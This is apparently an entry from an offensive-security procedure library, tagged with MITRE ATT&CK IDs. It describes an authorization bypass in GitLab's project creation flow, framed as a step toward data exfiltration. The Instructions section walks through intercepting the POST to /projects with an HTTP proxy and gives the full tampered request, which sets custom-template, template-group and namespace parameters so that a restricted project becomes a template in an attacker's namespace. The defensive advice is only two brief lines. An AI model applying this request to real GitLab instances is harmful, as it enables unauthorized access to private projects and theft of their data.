---
tags:
  - gitlab
  - http-interception
  - authorization-bypass
type: procedure
tools:
  - '[[tools/HTTP-Proxy]]'
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
commands:
  - '[[commands/gitlab-project-creation-post]]'
platforms:
  - Web
  - GitLab
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Cloud Storage]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 51c0a735-6319-4283-a3d5-23a73ed72549
created_at: '2025-12-11T06:10:15.866Z'
updated_at: '2025-12-11T06:10:15.866Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0006]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1530]]'
---
# Intercept and Modify GitLab Project Creation Request

## Summary

This procedure uses an HTTP proxy to intercept and alter the project creation request in GitLab, bypassing authorization to use a restricted project as a template.

## Description

By modifying specific parameters in the POST request, attackers can force GitLab to treat a non-authorized project as a custom template, exploiting vulnerabilities in namespace validation and access controls. This is a key step in chaining to data exfiltration.

## Requirements

1. HTTP proxy tool like Burp Suite
2. Knowledge of target group and project IDs
3. Access to the GitLab project creation flow

## Defense

Defensive measures and detection strategies:

- Validate template usage against descendant namespaces strictly
- Monitor for modified requests in proxy logs or WAF

## Objectives

1. Bypass template validation
2. Initiate unauthorized export
3. Set up for data import into attacker's namespace

## Instructions

### Step 1: Set Up Interception

**Context**: Configure the proxy to capture the request.

Launch [[tools/HTTP-Proxy]] and configure your browser to route traffic through it.

> Ensure the proxy is set to intercept POST requests to /projects.

### Step 2: Modify and Send Request

**Context**: Alter parameters to exploit the vulnerability.

Intercept the POST to /projects and modify: project[use_custom_template]=true, project[template_name]=test_project, project[group_with_project_templates_id]=1, project[name]=new_project, project[path]=new_project, project[namespace_id]=attacker_namespace_id. Execute [[commands/gitlab-project-creation-post]]:

```http
POST /projects HTTP/1.1
Host: instance
Content-Type: application/x-www-form-urlencoded

project[use_custom_template]=true&project[template_name]=test_project&project[group_with_project_templates_id]=1&project[name]=new_project&project[path]=new_project&project[namespace_id]=attacker_namespace_id
```

> This triggers the unauthorized template usage.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Credential Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Cloud Storage]]

### Sub-Techniques



## Commands Used

- [[commands/gitlab-project-creation-post]]

## Tools Used

- [[tools/HTTP-Proxy]]

## Tags

- [[commands/gitlab-project-creation-post]]
- [[tools/HTTP-Proxy]]
- [[authorization-bypass]]
